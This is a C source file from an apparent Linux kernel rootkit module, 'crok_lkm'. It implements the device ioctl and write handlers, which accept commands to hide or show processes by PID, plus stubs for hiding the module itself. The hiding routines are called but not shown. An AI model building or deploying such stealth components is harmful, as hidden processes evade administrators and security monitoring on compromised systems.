/*
 * crok_lkm
 * Copyright (C) 2023  Chistyakov Alexander
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/version.h>

#include "logging.h"
#include "types.h"
#include "ctrl/ctrl.h"
#include "device/details/cdev_utils.h"
#include "device/details/file_ops.h"
#include "device/details/parser_str_cmd.h"

long dev_ioctl(struct file* p_file, unsigned int cmd, unsigned long arg)
{
    int err = 0;
    int retval = 0;
    pid_t pid;
    module_dev_t* p_dev;

    /*
     * extract the type and number bitfields, and don't decode
     * wrong cmds: return ENOTTY (inappropriate ioctl) before access_ok()
     */
    if (_IOC_TYPE(cmd) != CROK_IOC_MAGIC) {
        return -ENOTTY;
    }
    if (_IOC_NR(cmd) > CROK_IOC_MAX_NR) {
        return -ENOTTY;
    }

    /*
     * the direction is a bitmask, and VERIFY_WRITE catches R/W
     * transfers. `Type' is user-oriented, while
     * access_ok is kernel-oriented, so the concept of "read" and
     * "write" is reversed
     */
    if (_IOC_DIR(cmd) & _IOC_WRITE) {
#if LINUX_VERSION_CODE < KERNEL_VERSION(5,0,0)
        err = ! access_ok(VERIFY_READ, (void __user *)arg, _IOC_SIZE(cmd));
#else
        err = ! access_ok((void __user *)arg, _IOC_SIZE(cmd));
#endif
    }
    if (err != 0) {
        return -EFAULT;
    }

    switch(cmd) {
    case CROK_IOC_RESET:
        /* @todo    Implement */
        break;
    case CROK_IOC_HIDE_PID:
        retval = __get_user(pid, (pid_t __user*)arg);
        if (retval != 0) {
            return retval;
        }
        p_dev = p_file->private_data;
        retval = ioc_hide_proc(p_dev, pid);
        break;
    case CROK_IOC_SHOW_PID:
        retval = __get_user(pid, (pid_t __user*)arg);
        if (retval != 0) {
            return retval;
        }
        p_dev = p_file->private_data;
        retval = ioc_show_proc(p_dev, pid);
        break;
    case CROK_IOC_HIDE_MOD:
        /* @todo    Implement */
        break;
    case CROK_IOC_SHOW_MOD:
        /* @todo    Implement */
        break;
    default:
        return -ENOTTY;
    }

    return 0;
}

int dev_open(struct inode* p_inode, struct file* p_file)
{
    module_dev_t* p_dev;   /* device information */

    KLOG_DEBUG(LOG_PREFIX "device::dev_read: open device");

    p_dev = container_of(p_inode->i_cdev, module_dev_t, cdev);
    p_file->private_data = p_dev;   /* for other methods */

    /* now trim to 0 the length of the device if open was write-only */
    if ((p_file->f_flags & O_ACCMODE) == O_WRONLY) {
        if (mutex_lock_interruptible(&p_dev->lock)) {
            return -ERESTARTSYS;
        }
        cdev_trim(p_dev);   /* ignore errors */
        mutex_unlock(&p_dev->lock);
    }
    return 0;               /* success */
}

ssize_t dev_read(struct file* p_file, char __user* p_buf, size_t count, loff_t* p_f_pos)
{
    KLOG_DEBUG(LOG_PREFIX "device::dev_read: read from device");
    return 0;
}

int dev_release(struct inode* p_inode, struct file* p_file)
{
    KLOG_DEBUG(LOG_PREFIX "device::dev_read: release device");
    return 0;
}

ssize_t dev_write(struct file* p_file, const char __user* p_buf, size_t count, loff_t* p_f_pos)
{
    const int MAX_BUF_SIZE = 255;

    char buffer[MAX_BUF_SIZE];
    module_dev_t* p_dev;
    unsigned int cmd = 0;
    unsigned long arg = 0;
    int rc = 0;

    KLOG_DEBUG(LOG_PREFIX "device::dev_read: write to device");

    if ((count > MAX_BUF_SIZE - 1) || (count < 13)) {
        KLOG_DEBUG(LOG_PREFIX "device::_check_cmd: invalid buffer size %ld", count);
        return -EFAULT;
    }

    memset(buffer, 0, MAX_BUF_SIZE);

    p_dev = p_file->private_data;
    if (copy_from_user(buffer, p_buf, count)) {
        KLOG_DEBUG(LOG_PREFIX "device::dev_read: failed to copy from user");
		return -EFAULT;
	}

    rc = parse_str_cmd(buffer, count, &cmd, &arg);
    if (rc != 0) {
        KLOG_DEBUG(LOG_PREFIX "device::dev_read: failed to parse command; reason %d", rc);
        return rc;
    }

    switch (cmd) {
    case CROK_IOC_HIDE_PID_CMD:
        rc = ioc_hide_proc(p_dev, arg);
        KLOG_DEBUG(LOG_PREFIX "device::dev_read: pid %ld has been hidden with result %d", arg, rc);
        break;
    case CROK_IOC_SHOW_PID_CMD:
        rc = ioc_show_proc(p_dev, arg);
        KLOG_DEBUG(LOG_PREFIX "device::dev_read: pid %ld has been showed with result %d", arg, rc);
        break;
    case CROK_IOC_HIDE_MOD_CMD:
    case CROK_IOC_SHOW_MOD_CMD:
        /* @todo    Implement */
        break;
    case CROK_IOC_LOG:
        SET_LOGF_LEVEL(arg);
        KLOG_DEBUG(LOG_PREFIX "device::dev_read: setted log level %ld", arg);
        break;
    default:
        return -EFAULT;
    }

    KLOG_DEBUG(LOG_PREFIX "device::dev_read: finished with return code %d", rc);
    return count;
}

